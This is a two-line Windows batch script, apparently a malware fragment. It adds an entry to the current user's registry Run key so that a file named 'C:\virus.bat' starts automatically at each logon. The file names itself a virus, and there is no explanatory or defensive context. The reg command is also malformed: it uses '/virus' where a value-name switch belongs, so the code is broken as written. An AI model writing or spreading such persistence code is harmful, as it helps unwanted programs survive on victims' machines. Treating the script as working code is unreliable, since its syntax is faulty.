@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /virus /t REG_SZ /d C:\virus.bat
